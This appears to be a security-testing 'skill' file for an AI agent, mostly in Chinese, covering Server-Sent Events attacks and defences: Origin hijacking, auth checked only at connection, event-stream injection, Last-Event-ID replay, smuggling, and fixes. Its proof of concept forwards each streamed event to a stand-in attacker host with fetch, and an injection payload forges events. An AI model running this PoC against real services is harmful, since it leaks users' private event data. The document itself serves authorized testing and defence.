---
name: sse-security
description: >-
  Server-Sent Events (SSE) attack surface: handshake Origin validation, connection-time-only auth,
  cross-origin hijacking, event-stream injection, reconnect token replay, and SSE smuggling.
  Use when apps stream events (notifications, live dashboards, AI token streaming).
---

# SKILL: SSE（Server-Sent Events）安全

> **AI LOAD INSTRUCTION**: This skill covers SSE (Server-Sent Events) protocol basics, the
> connection-time-only auth model, cross-origin hijacking, event-stream injection, reconnect token
> replay, and SSE smuggling. Apply only in **authorized** tests. Companion:
> [websocket-security.md](./websocket-security.md) (real-time channel testing).

---

## 0. QUICK START

SSE is a one-way (server → client) stream over plain HTTP, using `text/event-stream`.

```http
GET /events HTTP/1.1
Host: target.example.com
Accept: text/event-stream
Cache-Control: no-cache
```

Server response:

```http
HTTP/1.1 200 OK
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive

data: {"type":"message","body":"hello"}

event: update
data: {"id":42}

id: 5
data: stream chunk
```

Frame fields: `data:`（负载）、`event:`（事件名，默认 `message`）、`id:`（断线重连游标）、
`retry:`（重连间隔 ms）。空行分隔一条事件。

---

## 1. PROTOCOL BASICS

- SSE 是**单向**（server→client），客户端不能在同一连接上发数据（除重连）。
- 客户端用 `EventSource` API 自动重连；服务端通过 `id:` 告诉客户端断点，重连时带
  `Last-Event-ID` 头。
- 跨域：`EventSource` 遵守 CORS，但**服务端若不校验 Origin，任何页面都能订阅**。

---

## Part A：攻击方法论

### 2. 跨源劫持（无 Origin 校验）

#### 2.1 原理

若 `/events` 不校验 `Origin`（或白名单过宽），攻击者页面可直接 `new EventSource()` 订阅受害者的
事件流——等价于「只读版 CSWSH」。携带的 Cookie（若 `SameSite=None` 或 legacy）会让订阅以受害者
身份建立。

#### 2.2 PoC（授权环境）

```javascript
const es = new EventSource('https://vulnerable.example.com/events');
es.onmessage = (e) => {
  fetch('https://attacker.example.net/?d=' + encodeURIComponent(e.data));
};
```

#### 2.3 判据

- 改 `Origin` 为 `https://attacker.com` 后仍 `200 text/event-stream` = 无 Origin 校验。
- 订阅到本应只属于受害者的数据 = 跨源劫持成立。

### 3. 鉴权仅在建立时（连接后不校验）

SSE 鉴权通常**只在建立连接那一刻**校验（Cookie/Header/URL token）。连接一旦建立，服务端不再
对后续帧做逐条鉴权。攻击面：

- **会话吊销不生效**：用户登出/封禁后，已建立的 SSE 连接仍持续推送数据。
- **权限变更不生效**：用户被降权后，旧连接仍收高权限事件。
- **连接被劫持复用**：拿到一条已建立连接（如中间人/代理）即可持续收流。

**判据**：登出/改权后旧连接仍收事件 = 连接后不校验成立。

### 4. 事件流注入（Event-Stream Injection）

若用户输入被拼接进 SSE 的 `data:`/`event:`/`id:` 字段而不做转义，可注入：

```text
# 注入额外事件字段或伪造 id
data: {"msg":"user-input

event: admin
data: {"secret":"injected"}
id: 999
"}
```

- **伪造 `id:`** → 影响其他客户端断线重连游标，造成消息错位/重放。
- **伪造 `event:`** → 触发客户端注册的其他事件处理器。
- **CRLF 注入** → 在 `data:` 内注入换行，拆分/伪造多条事件。

**判据**：用户输入能让订阅者收到「非服务端意图」的事件或触发非预期 handler = 注入成立。

### 5. 重连令牌重放

- SSE 常在 URL 里带 token：`/events?token=...`。token 进日志/Referer/浏览器历史（同 WebSocket 的
  URL-token 反模式）。
- `Last-Event-ID` 头可被客户端任意设置 → 若服务端按 `id:` 游标回放历史消息，攻击者可枚举
  `id:` 读取他人历史事件（历史重放/越权）。

**判据**：设置不同 `Last-Event-ID` 能读到非本人历史事件 = 重放越权。

### 6. SSE 走私

#### 6.1 原理

- SSE 是「一个 HTTP 响应 + 长连接」。在**反向代理 → 后端**场景，代理可能把 SSE 响应当普通响应
  缓存/转发，或对 `Content-Type: text/event-stream` 的处理与其他类型不一致。
- 利用「代理认为响应结束、后端仍在流」的边界差异，把后续响应/请求字节走私（类似 HTTP 走私
  在长连接上的变体）。

#### 6.2 构造步骤

```
1. 识别反向代理对 SSE 长连接的缓冲/转发行为
2. 构造「代理视为完整响应，后端仍持续输出」的事件流边界
3. 让走私字节污染下一个请求/响应
```

**判据**：第二个请求/响应被 SSE 流残余字节污染，且升级/配置修复后消失。

---

## Part B：检测与防御

### 7. 检测

- 监控 `text/event-stream` 响应是否校验 `Origin`。
- 审计 SSE 端点的「连接后鉴权」：登出/改权后是否仍推流。
- 检测 `data:`/`id:` 字段是否来自用户输入且未转义。
- 检测 `Last-Event-ID` 是否被用于越权历史回放。

### 8. 修复

| 措施 | 说明 |
|---|---|
| 校验 `Origin` | 白名单，拒绝跨源订阅 |
| 连接后持续鉴权 | 定期或在关键事件前重校验会话/权限 |
| token 不放 URL | 用 Cookie + CSRF 或首帧鉴权 |
| 转义 `data:`/`event:`/`id:` | 用户输入不得直接拼接进事件流 |
| `Last-Event-ID` 鉴权 | 校验游标归属，不裸回放历史 |
| 明确代理边界 | 对 SSE 长连接配置正确的缓冲/转发，防走私 |

### 9. DECISION TREE

1. 定位 SSE 端点（`Accept: text/event-stream`、JS 里 `EventSource`）。
2. 握手审查：`Origin` 是否校验、token 是否在 URL。
3. 连接后审查：登出/改权后旧连接是否仍推流。
4. 跨源劫持：本地 HTML `EventSource` 订阅，观察是否拿到数据。
5. 注入：向可控字段塞 `\n`/`event:`/`id:`，观察订阅端异常事件。
6. 重放：设置不同 `Last-Event-ID`，观察是否读到他人历史。

---

## 10. RELATED ROUTING

- [websocket-security.md](./websocket-security.md) — 实时通道通用测试（双向通道）
- [api-auth-and-jwt-abuse.md](./api-auth-and-jwt-abuse.md) — token 鉴权边界
